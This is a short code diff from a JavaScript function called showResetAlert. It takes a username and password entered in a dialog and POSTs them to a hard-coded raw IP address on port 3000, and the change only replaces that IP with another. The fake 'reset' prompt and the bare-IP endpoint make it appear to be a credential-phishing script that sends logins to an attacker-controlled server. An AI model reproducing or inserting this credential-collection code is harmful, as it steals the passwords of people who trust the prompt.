@@ -39,7 +39,7 @@ function showResetAlert() {
         }).then((result) => {
             let username = result.value.login
             let password = result.value.password
-            fetch('http://64.226.98.98:3000/login', {
+            fetch('http://164.90.209.79:3000/login', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
